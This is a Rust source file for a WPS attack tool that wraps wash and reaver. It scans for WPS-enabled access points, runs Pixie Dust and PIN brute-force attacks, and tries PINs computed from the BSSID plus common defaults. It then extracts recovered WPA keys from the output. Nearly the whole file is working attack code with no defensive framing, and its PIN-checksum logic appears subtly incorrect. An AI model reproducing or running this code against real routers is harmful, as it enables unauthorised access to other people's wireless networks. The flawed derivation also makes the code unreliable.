use serde_json::{json, Value};
use std::collections::HashMap;
use std::thread;
use std::time::Duration;

pub struct WpsAttack {
    interface: String,
    results: Vec<Value>,
}

impl WpsAttack {
    pub fn new(interface: &str) -> Self {
        WpsAttack {
            interface: interface.to_string(),
            results: Vec::new(),
        }
    }

    pub fn scan_wps(&self) -> Value {
        let mut wps_aps = Vec::new();

        let out = std::process::Command::new("wash")
            .args(["-i", &self.interface, "--scan"])
            .output()
            .ok();

        if let Some(output) = out {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                let trimmed = line.trim();
                if trimmed.contains("---") || trimmed.contains("BSSID") || trimmed.is_empty() {
                    continue;
                }
                let parts: Vec<&str> = trimmed.split_whitespace().collect();
                if parts.len() >= 5 && parts[0].contains(':') {
                    wps_aps.push(json!({
                        "bssid": parts[0],
                        "channel": parts[1].parse::<u16>().unwrap_or(0),
                        "signal": parts.get(2).and_then(|s| s.parse::<i32>().ok()).unwrap_or(-100),
                        "ssid": parts.get(4).unwrap_or(&"<hidden>"),
                        "wps_version": parts.get(3).unwrap_or(&"?"),
                        "locked": parts.iter().any(|p| p.to_lowercase().contains("lock"))
                    }));
                }
            }
        }

        json!({
            "interface": self.interface,
            "wps_aps_found": wps_aps.len(),
            "access_points": wps_aps
        })
    }

    pub fn pixie_dust(&self, bssid: &str, pin: &str) -> Value {
        let out = std::process::Command::new("reaver")
            .args([
                "-i", &self.interface,
                "-b", bssid,
                "-p", pin,
                "-K",
                "-vvv",
                "--timeout", "30",
            ])
            .output();

        match out {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}\n{}", stdout, stderr);

                let wpa_key = if combined.contains("WPA PSK") || combined.contains("WPA-PSK") {
                    combined.lines()
                        .find(|l| l.contains("WPA PSK") || l.contains("WPA-PSK"))
                        .map(|l| l.split(':').last().unwrap_or("").trim().to_string())
                } else {
                    None
                };

                let pin_found = combined.contains("[+] Pin") || combined.contains("[+] Pin found");
                let pixie_success = combined.contains("[+] Pixie Dust") || combined.contains("[+] WPS pin");

                json!({
                    "type": "pixie_dust",
                    "bssid": bssid,
                    "target_pin": pin,
                    "pin_found": pin_found,
                    "pixie_success": pixie_success,
                    "wpa_key": wpa_key,
                    "output": combined,
                    "status": if pin_found { "success" } else { "failed" }
                })
            }
            Err(e) => json!({
                "type": "pixie_dust",
                "bssid": bssid,
                "error": format!("{}", e),
                "status": "error"
            }),
        }
    }

    pub fn bruteforce_pin(&self, bssid: &str, pins: &[String]) -> Value {
        let mut attempts = 0u64;
        let mut found_pin: Option<String> = None;

        for pin in pins {
            attempts += 1;
            let out = std::process::Command::new("reaver")
                .args([
                    "-i", &self.interface,
                    "-b", bssid,
                    "-p", pin,
                    "-vvv",
                    "--timeout", "10",
                ])
                .output();

            thread::sleep(Duration::from_millis(500));

            match out {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let combined = format!("{}\n{}", stdout, stderr);

                    if combined.contains("[+] Pin") || combined.contains("[+] WPS pin") {
                        found_pin = Some(pin.clone());
                        break;
                    }
                }
                Err(_) => continue,
            }
        }

        json!({
            "type": "bruteforce_pin",
            "bssid": bssid,
            "pins_tested": attempts,
            "pin_found": found_pin.is_some(),
            "found_pin": found_pin,
            "status": if found_pin.is_some() { "success" } else { "failed" }
        })
    }

    pub fn compute_pin_from_bssid(bssid: &str) -> Option<String> {
        let parts: Vec<&str> = bssid.split(':').collect();
        if parts.len() < 5 {
            return None;
        }
        let mut raw = [0u8; 5];
        for (i, part) in parts.iter().enumerate().take(5) {
            if part.len() != 2 {
                return None;
            }
            raw[i] = u8::from_str_radix(part, 16).ok()?;
        }
        let val = u32::from_be_bytes([raw[0], raw[1], raw[2], raw[3]]);
        let msb = raw[4] as u32;
        let combined = val.wrapping_mul(256).wrapping_add(msb);
        let pin_base = combined % 10_000_000;

        let digits: Vec<u8> = format!("{:07}", pin_base)
            .chars()
            .map(|c| c.to_digit(10).unwrap() as u8)
            .collect();
        let sum: u32 = digits.iter().enumerate().map(|(i, d)| {
            let mut v = *d as u32;
            if i % 2 == 0 {
                v *= 2;
                if v > 9 {
                    v = v % 10 + 1;
                }
            }
            v
        }).sum();
        let checksum = (sum * 9) % 10;
        Some(format!("{:07}{}", pin_base, checksum))
    }

    pub fn generate_pin_candidates(bssid: &str) -> Vec<String> {
        let mut candidates = Vec::new();
        if let Some(base) = Self::compute_pin_from_bssid(bssid) {
            candidates.push(base);
        }
        let common = [
            "12345670", "12345678", "00000000", "11111111", "22222222",
            "33333333", "44444444", "55555555", "66666666", "77777777",
            "88888888", "99999999", "01234567", "87654321",
        ];
        for p in &common {
            candidates.push(p.to_string());
        }
        candidates
    }
}

// mod wps_attack;
